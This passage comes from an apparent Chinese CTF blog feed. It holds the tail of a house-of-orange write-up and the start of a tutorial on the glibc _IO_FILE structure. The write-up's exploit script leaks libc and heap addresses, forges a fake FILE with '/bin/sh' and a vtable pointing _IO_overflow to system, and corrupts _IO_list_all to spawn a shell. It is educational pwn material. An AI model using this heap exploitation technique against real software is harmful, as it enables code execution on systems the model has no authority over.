class=\"token number\">16672</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>main_arena <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x7ffff7bc4b20</span> <span class=\"token operator\">-</span> libc_base<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> libc_base</pre></td></tr><tr><td data-num=\"75\"></td><td><pre>io_list_all<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_list_all'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>sys_addr<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>payload<span class=\"token operator\">=</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4b1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0X600</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0X500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x508</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4d1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x508</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xaf1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0X500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x5b0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre></pre></td></tr><tr><td data-num=\"98\"></td><td><pre></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x508</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xae1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x600</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x521</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x4a0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre></pre></td></tr><tr><td data-num=\"111\"></td><td><pre></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>heapbase <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x1ba61</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'main_arena'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'heapbase'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'libc_base'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token string\">b'B'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token operator\">-</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>p <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>p <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>p <span class=\"token operator\">+=</span> <span class=\"token string\">b'B'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre><span class=\"token comment\"># fake file</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>f <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\x00'</span> <span class=\"token comment\"># flag overflow arg -> system('/bin/sh')</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x61</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\"># _IO_read_ptr small bin size</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre><span class=\"token comment\">#  unsoted bin attack</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_read_end)</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>io_list_all <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># _IO_read_base</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre></pre></td></tr><tr><td data-num=\"130\"></td><td><pre><span class=\"token comment\">#bypass check</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre><span class=\"token comment\"># 使 fp->_IO_write_base &lt; fp->_IO_write_ptr 绕过检查</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_write_base </span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_write_ptr</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_write_end</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_buf_base</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_buf_end</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_save_base</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_backup_base</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_save_end</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># *_markers</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># *_chain</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>f <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _fileno</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>f <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _flags2</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># _old_offset</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>f <span class=\"token operator\">+=</span> p16<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># ushort _cur_colum;</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>f <span class=\"token operator\">+=</span> p8<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># char _vtable_offset</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>f <span class=\"token operator\">+=</span> p8<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># char _shrotbuf[1]</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>f <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># null for alignment</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _offset</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _codecvt</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _wide_data</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _freeres_list</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _freeres_buf</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># __pad5</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>f <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _mode 为了绕过检查，fp->mode &lt;=0 ((addr + 0xc8) &lt;= 0)</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre>f <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _unused2</span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>p <span class=\"token operator\">+=</span> f</pre></td></tr><tr><td data-num=\"165\"></td><td><pre>p <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">3</span> <span class=\"token comment\"># alignment to vtable</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>p <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>heapbase <span class=\"token operator\">+</span> <span class=\"token number\">0x23010</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># vtable 指向自己</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>p <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>p <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>sys_addr<span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_overflow 位置改为 system</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>payload <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x4f8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x181</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x4f8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">19</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span>\t</pre></td></tr><tr><td data-num=\"176\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>Mea<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Size :\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>house-of-orange，其实难度不高。但是在影响以后的攻击起到了巨大的作用</p>\n</blockquote>\n<blockquote>\n<p>参考</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9ob3VzZS1vZi1vcmFuZ2Uv\">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-orange/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLndqaHdqaG4uY29tL3Bvc3RzL2hvdXNlLW9mLW9yYW5nZS0lRTUlQUQlQTYlRTQlQjklQTAlRTglQUUlQjAlRTUlQkQlOTUv\">https://blog.wjhwjhn.com/posts/house-of-orange - 学习记录 /</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yb2Rlcmlja2NoYW4uZ2l0aHViLmlvL3poLWNuLzIwMjMtMDItMjctaG91c2Utb2YtYWxsLWFib3V0LWdsaWJjLWhlYXAtZXhwbG9pdGF0aW9uLyMyNS1ob3VzZS1vZi1vcmFuZ2U=\">Glibc 堆利用之 house of 系列总结 - roderick - record and learn! (roderickchan.github.io)</span></p>\n</blockquote>\n",
            "tags": [
                "house系列",
                "house-of-orange"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/07/15/IO-FILE/",
            "url": "https://yhuanhuan01.github.io/2024/07/15/IO-FILE/",
            "title": "IO_FILE",
            "date_published": "2024-07-15T04:24:42.000Z",
            "content_html": "<h1 id=\"io_file1\"><a class=\"markdownIt-Anchor\" href=\"#io_file1\">#</a> IO_FILE（1）</h1>\n<blockquote>\n<p>前言：为了好好学习 house-of-orange 的利用，先在 house-of-orange 专题之前写一些 IO_FILE 的利用</p>\n</blockquote>\n<h3 id=\"_io_file-结构\"><a class=\"markdownIt-Anchor\" href=\"#_io_file-结构\">#</a> _IO_FILE 结构</h3>\n<p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值 —— 文件描述符（eg:stdin=0;stdout=1)。</p>\n<p>在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：<strong>stdin、stdout、stderr，分别对应文件描述符：0、1、2</strong>。假设现在第一次用 fopen 打开一个文件流，这个文件流的文件描述符就为 3 。默认打开的三个文件流分配 libc data 段。fopen 等文件流控制函数创建的文件流是分配在堆上。</p>\n<p>FILE 结构体定义在 libio.h ：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_FILE</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">int</span> _flags<span class=\"token punctuation\">;</span>       <span class=\"token comment\">/* 高位字为_IO_MAGIC；剩下的就是旗帜。 */</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">_IO_file_flags</span> <span class=\"token expression\">_flags</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token comment\">/* 以下指针对应于 C++ Streambuf 协议。 */</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token comment\">/* 注意：Tk 直接使用 _IO_read_ptr 和 _IO_read_end 字段。 */</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> _IO_read_ptr<span class=\"token punctuation\">;</span>   <span class=\"token comment\">/* Current read pointer */</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> _IO_read_end<span class=\"token punctuation\">;</span>   <span class=\"token comment\">/* End of get area. */</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> _IO_read_base<span class=\"token punctuation\">;</span>  <span class=\"token comment\">/* Start of putback+get area. */</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> _IO_write_base<span class=\"token punctuation\">;</span> <span class=\"token comment\">/* Start of put area. */</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> _IO_write_ptr<span class=\"token punctuation\">;</span>  <span class=\"token comment\">/* Current put pointer. */</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> _IO_write_end<span class=\"token punctuation\">;</span>  <span class=\"token comment\">/* End of put area. */</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> _IO_buf_base<span class=\"token punctuation\">;</span>   <span class=\"token comment\">/* Start of reserve area. */</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> _IO_buf_end<span class=\"token punctuation\">;</span>    <span class=\"token comment\">/* End of reserve area. */</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token comment\">/* The following fields are used to support backing up and undo. */</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_save_base<span class=\"token punctuation\">;</span> <span class=\"token comment\">/* Pointer to start of non-current get area. */</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_backup_base<span class=\"token punctuation\">;</span>  <span class=\"token comment\">/* Pointer to first valid character of backup area */</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_save_end<span class=\"token punctuation\">;</span> <span class=\"token comment\">/* Pointer to end of non-current get area. */</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_marker</span> <span class=\"token operator\">*</span>_markers<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_FILE</span> <span class=\"token operator\">*</span>_chain<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token keyword\">int</span> _fileno<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\"><span class=\"token number\">0</span></span></span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token keyword\">int</span> _blksize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">else</span></span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token keyword\">int</span> _flags2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  _IO_off_t _old_offset<span class=\"token punctuation\">;</span> <span class=\"token comment\">/* This used to be _offset but it's too small.  */</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">__HAVE_COLUMN</span> <span class=\"token comment\">/* temporary */</span></span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token comment\">/* 1+column number of pbase(); 0 is unknown. */</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> _cur_column<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token keyword\">signed</span> <span class=\"token keyword\">char</span> _vtable_offset<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token keyword\">char</span> _shortbuf<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token comment\">/*  char* _save_gptr;  char* _save_egptr; */</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  _IO_lock_t <span class=\"token operator\">*</span>_lock<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">_IO_USE_OLD_IO_FILE</span></span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>其实进程中的 FILE 结构会通过 <code>_chain</code>  